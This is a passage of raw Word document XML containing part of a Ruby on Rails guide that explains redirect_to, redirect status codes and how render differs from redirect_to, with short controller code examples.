          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>. For example, you could redirect from wherever you are in your code to the index of photos in your application with this call:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="48002094" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66F10956" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="902326441"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>redirect_to photos_url</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47EE9CAA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with any arguments that you could use with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>link_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r>
        <w:t>. There’s also a special redirect that sends the user back to the page they just came from:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3170308A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27FD09DD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1301501857"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>redirect_to :back</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3802DC06" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.1 Getting a Different Redirect Status Code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BFAD5E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> status code 302, a temporary redirect, when you call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. If you’d like to use a different status code, perhaps 301, a permanent redirect, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4608"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0000BFD6" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="346ACB29" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1986085066"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>redirect_to photos_path, :status</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 301</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="37CC2359" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Just like the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accepts both numeric and symbolic header designations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D74E66D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.3.2 The Difference Between </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B8A3BC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sometimes inexperienced developers think of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a sort of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>goto</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command, moving execution from one place to another in your Rails code. This is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> correct. Your code stops running and waits for a new request for the browser. It just happens that you’ve told the browser what request it should make next, by sending back an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 302 status code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6E4FB7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Consider these actions to see the difference:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4728"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7F204BF8" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48F51963" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DDBD91B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @books</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7624E175" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FEA410F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58CECA85" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="103C23B7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find_by_id(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E32DD53" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.nil?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30619BAF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "index"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B9E5D05" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7563577D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="150F6926" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With the code in this form, there will likely be a problem if the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@book</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Remember, a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render :action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> doesn’t run any code in the target action, so nothing will set up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable that the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> view will probably require. One way to fix this is to redirect instead of rendering:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4728"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="79BC2755" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B419A9E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6ED561A2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @books</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B0F7393" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AD17B48" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="017371CC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44E13D4E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find_by_id(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF9BAE6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.nil?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A83B529" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    redirect_to :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29C9DB29" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FE971B6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="423DEE60" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this code, the browser will make a fresh request for the index page, the code in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method will run, and all will be well.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEEB483" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The only downside to this code is that it requires a round trip to the browser: the browser requested the show action with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/books/1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the controller finds that there are no books, so the controller sends out a 302 redirect response to the browser telling it to go to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/books/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the browser complies and sends a new request back to the controller asking now for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action, the controller then gets all the books in the database and renders the index template, sending it back down to the browser which then shows it on your screen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8FE50C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>While in a small application, this added latency might not be a problem, it is something to think about if response time is a concern. We can demonstrate one way to handle this with a contrived example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7128"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="02132AC5" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4752E6EF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5272360A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @books</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="029007F6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A8E122D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="675C2FD3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56A39C93" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find_by_id(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DBA94F5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.nil?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59F167E0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @books</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D2AD34B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render "index", :alert</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Your book was not found!'</w:t>
            </w:r>
          </w:p>
